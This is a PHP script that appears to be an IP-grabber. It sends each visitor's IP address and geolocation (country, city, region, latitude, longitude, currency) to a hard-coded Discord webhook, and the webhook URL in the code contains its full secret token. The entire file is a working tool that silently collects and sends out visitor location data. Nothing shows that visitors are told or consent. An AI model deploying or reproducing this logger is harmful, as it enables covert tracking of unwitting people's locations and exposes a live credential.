<?php 
include('pushIP.php');
include('flagChange.php');
$webhookurl = 'https://discord.com/api/webhooks/1147890737380343919/N1PS7Roz1QElTwdzRb6Fzkyukq9WUFZah5OYfazHCVFVmgSCLpJVGit3I3DTVzaZ_1z2';
$json_data = json_encode([
    "content" => "**New Log IP** <a:meme_fallseinberg:793579434199744532>",
    "username" => "Logs",
    "embeds" => [
        [
          "description" => "##  IP: $ipRequest",
          "color" => hexdec("3366ff"),
          "fields" => [
            [
                "name" => "Country",
                "value" => ":flag_" . strtolower($countryCode) . ":" . " $countryCode",
                "inline" => true
            ],
            [
                "name" => "City",
                "value" => "$cityName",
                "inline" => true
            ],
            [
                "name" => "Region",
                "value" => "$regionName",
                "inline" => true                
            ],
            [
                "name" => "Currency",
                "value" => "$currencySymbol - $currencyCode",
                "inline" => true                
            ],
            [
                "name" => "Currency Converter in Dollar",
                "value" => "$currencyConverter",
                "inline" => true
            ],
            [
                "name" => "Currency Symbol UTF8",
                "value" => "$currencyCodeUTF8",
                "inline" => true
            ],
            [
                "name" => "Latitude",
                "value" => "$latitudeNumber",
                "inline" => true
            ],
            [
                "name" => "Longitude",
                "value" =>  "$longitudeNumber",
                "inline" => true                
            ],
            [
                "name" => "Continent",
                "value" => "$continentName",
                "inline"=> true
            ],
          ]
        ]
     ],
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init( $webhookurl );

curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
curl_close( $ch );